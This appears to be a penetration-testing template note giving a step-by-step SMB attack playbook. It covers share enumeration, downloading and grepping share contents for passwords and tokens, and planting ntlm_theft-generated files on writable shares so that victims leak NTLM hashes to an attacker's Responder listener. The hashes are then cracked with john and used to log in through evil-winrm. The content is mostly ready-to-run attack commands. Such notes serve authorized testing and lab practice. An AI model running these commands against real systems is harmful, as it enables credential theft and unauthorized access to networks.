## check if any available shares

no creds
```powershell
enum4linux <% tp.frontmatter["RHOSTS"] %>
  
smbclient -N -L \\\\<% tp.frontmatter["RHOSTS"] %>\\

```

with creds
```powershell
smbclient -U '<% tp.frontmatter["domain-username"] %>' -L \\\\<% tp.frontmatter["RHOSTS"] %>\\
```

#### If we found something, 
no creds
```powershell
smbclient \\\\<% tp.frontmatter["RHOSTS"] %>\\share-name
```

with creds
```powershell
smbclient -U '<% tp.frontmatter["VHOST"] %>/<% tp.frontmatter["domain-username"] %>' \\\\<% tp.frontmatter["RHOSTS"] %>\\share-name
```
we can mount the smb share folder using the following command
```powershell
sudo mount -t cifs -o 'user=<% tp.frontmatter["domain-username"] %>' //<% tp.frontmatter["RHOSTS"] %>/share-name /mnt/ 
```
#### download everything 
```powershell
mget *
```
#### grep passswords and secrets
```powershell
grep -rinE '(password|username|user|pass|key|token|secret|admin|login|credentials)'
find /mnt/ -type f -name Groups.xml 2>/dev/null
```

if Groups.xml found, please refer to [[5- Templates/non-categorized notes/active directory related/crack Groups.xml]]
### Are we able to upload files to SMB?
```powershell
echo "test" > test.txt
smbclient \\\\<% tp.frontmatter["RHOSTS"] %>\\share-name
put test.txt
```

If yes,
we can exploit it as following 

1- run reponder
```powershell
sudo responder -I tun0 -wv
```
2- make sure SMB server is [ON]
![[Assets/Pasted image 20250429105618.png|300]]
3- check the listening port  in reponder
![[Assets/Pasted image 20250429105628.png|300]]
next is the [[NTLM_theft]] files generation
4- run [[NTLM_theft]] to generate malicious files (reverse shell)
clone it 
```powershell
git clone https://github.com/Greenwolf/ntlm_theft.git
cd ntlm_theft

python3 ntlm_theft.py --generate all --server <% tp.frontmatter["LHOST"] %> --file output_folder
```
move to output folder
```powershell
cd output_folder 
```
connect back to smbclient
```powershell
smbclient \\\\<% tp.frontmatter["RHOSTS"] %>\\share-name
```
5- move the files to smb share folder and wait.
```powershell
put output_folder-(icon).url
```
6- get the NTLM hash on responder side

save it to **hash** file
```powershell
subl hash
```
7- crack it with john
```powershell
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

## evil-winrm
1- login with evil-winrm
```powershell
evil-winrm -i <% tp.frontmatter["RHOSTS"] %> -u <% tp.frontmatter["domain-username"] %> -p '<% tp.frontmatter["domain-password"] %>' # change the username and password
```
